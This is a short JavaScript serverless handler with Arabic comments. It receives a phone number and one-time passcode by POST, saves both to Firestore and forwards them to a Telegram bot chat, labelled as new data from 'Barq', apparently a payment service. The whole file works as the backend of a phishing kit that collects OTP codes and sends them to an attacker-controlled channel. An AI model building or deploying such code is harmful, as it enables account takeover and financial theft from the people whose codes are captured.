import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc } from "firebase/firestore";

// إعداد Firebase من متغيرات البيئة التي أضفتها في Vercel
const firebaseConfig = JSON.parse(process.env.FIREBASE_CONFIG);
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ message: 'Method not allowed' });

    const { phone, otp } = req.body;

    try {
        // 1. الحفظ في Firebase Firestore
        await addDoc(collection(db, "users"), {
            phone: phone,
            otp: otp,
            timestamp: new Date()
        });

        // 2. الإرسال إلى بوت تليجرام
        const message = `بيانات جديدة من برق:\nرقم الجوال: ${phone}\nالرمز: ${otp}`;
        const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: process.env.TELEGRAM_CHAT_ID, 
                text: message 
            })
        });

        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}
